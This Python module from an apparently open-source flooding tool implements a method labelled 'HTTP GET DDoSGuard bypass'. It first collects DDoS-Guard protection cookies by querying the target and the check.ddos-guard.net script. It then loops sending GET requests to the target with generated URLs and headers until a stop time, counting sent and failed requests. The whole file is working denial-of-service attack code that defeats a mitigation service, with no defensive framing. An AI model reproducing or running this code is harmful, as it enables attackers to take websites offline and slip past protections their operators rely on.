'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, requests
from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:
    '''
    launches a HTTP GET flood
    '''

    if not Core.ddosguard_cookies_grabbed: # if no cookies have been found yet, we try and grab them first
        headers = utils().buildheaders(url)
        session = requests.session() # we can't use the utils().buildsession() function, because that one has a timeout of 0.1 ms
        idss = None

        try:
            with session.get(url, headers=headers, verify=False) as req:
                for key, value in req.cookies.items():
                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
        except Exception:
            pass
        
        try:
            with session.post("https://check.ddos-guard.net/check.js", headers=headers, verify=False) as req:
                for key, value in req.cookies.items():
                    if key == '__ddg2':
                        idss = value

                    Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
        except Exception:
            pass
        
        if idss:
            try:
                with session.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=headers, verify=False) as req:
                    for key, value in req.cookies.items():
                        Core.session.cookies.set_cookie(requests.cookies.create_cookie(key, value))
            except Exception:
                pass
        
        Core.ddosguard_cookies_grabbed = True
        print('[DDOS-GUARD] Got cookies')

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            Core.session.get(
                utils().buildblock(url), 
                headers=utils().buildheaders(url),
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

# add the method to the methods dictionary
Core.methods.update({
    'DDG': {
        'info': 'HTTP GET DDoSGuard bypass',
        'func': flood
    }
})